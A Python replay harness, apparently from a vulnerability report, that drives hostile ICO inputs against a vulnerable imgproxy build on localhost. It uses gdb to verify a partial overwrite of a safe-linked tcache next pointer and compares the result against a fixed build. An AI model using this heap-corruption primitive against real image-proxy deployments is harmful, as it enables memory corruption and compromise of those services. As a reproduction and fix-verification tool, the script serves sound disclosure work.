#!/usr/bin/env python3
"""Bounded replay of the W8 wire-only partial tcache-next overwrite.

    python3 replay_partial_next.py /absolute/outdir

Runs six plain and six gdb-instrumented hostile ICOs on 127.0.0.1:18180/18181
against the pinned vulnerable CLI, plus ICO-fixed plain and gdb controls.
Passes only if a live tcache victim keeps its size while wire bytes change
the low 16 bits of its safe-linked `next`, the decoded value becomes the
live tcache head with a positive count, a plain run survives with HTTP 500,
and the fixed binary rejects before the write. Addresses are ASLR-dependent,
so the assertion uses relative fields, not absolute addresses.
"""
import hashlib
import os
import re
import subprocess
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
PROBE = os.path.join(HERE, "ico_partial_next.py")
VULN = os.path.join(HERE, "imgproxy-vuln")
FIXED = os.path.join(HERE, "imgproxy-icofixed")


def qword(block, addr):
    for line in block.splitlines():
        m = re.match(r"(0x[0-9a-f]+):\s+(0x[0-9a-f]+)\s+(0x[0-9a-f]+)", line)
        if m:
            a = int(m.group(1), 16)
            if a == addr:
                return int(m.group(2), 16)
            if a + 8 == addr:
                return int(m.group(3), 16)
    return None


def check_gdb(path, low):
    text = open(path, errors="replace").read()
    if "GDB_HIT" not in text:
        return False, "no read_full hit"
    m = re.search(r"GDB_BASE (0x[0-9a-f]+)", text)
    if not m:
        return False, "no base"
    pos = int(m.group(1), 16) + 32
    blocks = text.split("GDB_POST 12x8 at base-16:")
    pre = blocks[0].split("GDB_PRE 12x8 at base-16:")[-1]
    post = blocks[1] if len(blocks) > 1 else ""
    pre_size, post_size = qword(pre, pos - 8), qword(post, pos - 8)
    pre_next, post_next = qword(pre, pos), qword(post, pos)
    head = re.search(r"GDB_TCACHE_POST head=(0x[0-9a-f]+) count=(\d+)", text)
    if None in (pre_size, post_size, pre_next, post_next) or not head:
        return False, "missing memory fields"
    size_ok = pre_size == 0x35 and post_size == 0x35
    high_ok = pre_next >> 16 == post_next >> 16
    low_ok = post_next & 0xFFFF == low
    decoded = post_next ^ (pos >> 12)
    head_ok = int(head.group(1), 16) == decoded and int(head.group(2)) >= 2
    detail = (f"size {pre_size:#x}->{post_size:#x} high_ok={high_ok} "
              f"low={post_next & 0xffff:#06x} decoded={decoded:#x} "
              f"head={head.group(1)} count={head.group(2)}")
    return size_ok and high_ok and low_ok and head_ok, detail


def run(tag, low, size, mode, binary, env):
    argv = [sys.executable, PROBE, tag, hex(low), "20", "2", mode]
    argv += [hex(size), binary]
    p = subprocess.run(argv, env=env, text=True, capture_output=True)
    out = p.stdout + p.stderr
    with open(os.path.join(env["W8_OUTDIR"], f"stdout-{tag}.txt"), "w") as f:
        f.write(out)
    return out


def sha(path):
    return hashlib.sha256(open(path, "rb").read()).hexdigest()


def main():
    if len(sys.argv) != 2:
        print(__doc__)
        return 2
    outdir = os.path.abspath(sys.argv[1])
    os.makedirs(outdir, exist_ok=True)
    env = dict(os.environ, W8_OUTDIR=outdir)
    checks, details = [], []

    plain_survive = 0
    for i in range(1, 7):
        out = run(f"plain{i}", 0, 0x35, "plain", VULN, env)
        ok = "hostile=500:" in out and "rc=None" in out
        plain_survive += ok
        details.append(f"plain{i} survived={ok}")
    checks.append(plain_survive > 0)
    details.append(f"plain survival runs={plain_survive}/6")

    gdb_ok = 0
    for i in range(1, 7):
        out = run(f"gdb{i}", 0, 0x35, "gdb", VULN, env)
        ok, detail = check_gdb(os.path.join(outdir, f"w8-gdb{i}.log"), 0)
        gdb_ok += ok
        details.append(f"gdb{i} partial_next={ok} {detail}")
    checks.append(gdb_ok > 0)
    details.append(f"gdb partial_next runs={gdb_ok}/6")

    fixed_plain = run("fixedplain", 0, 0x35, "plain", FIXED, env)
    log = open(os.path.join(outdir, "w8-fixedplain.log"), errors="replace").read()
    ok = "hostile=500:" in fixed_plain and "ICO image data is too large" in log
    checks.append(ok)
    details.append(f"fixed plain rejects_early={ok}")

    run("fixedgdb", 0, 0x35, "gdb", FIXED, env)
    log = open(os.path.join(outdir, "w8-fixedgdb.log"), errors="replace").read()
    ok = "GDB_HIT" not in log
    checks.append(ok)
    details.append(f"fixed gdb zero_hits={ok}")

    for name in ("w8-gdb2.log", "w8-gdb5.log", "w8-plain1.log",
                 "w8-fixedplain.log", "w8-fixedgdb.log"):
        path = os.path.join(outdir, name)
        if os.path.exists(path):
            details.append(f"sha256 {name} {sha(path)}")
    print("W8_REPLAY " + " ".join(details), flush=True)
    print(f"W8_RESULT PASS={sum(checks)} FAIL={len(checks)-sum(checks)} "
          f"PARTIAL_NEXT={gdb_ok} PLAIN_SURVIVAL={plain_survive}", flush=True)
    return 0 if all(checks) else 1


if __name__ == "__main__":
    sys.exit(main())
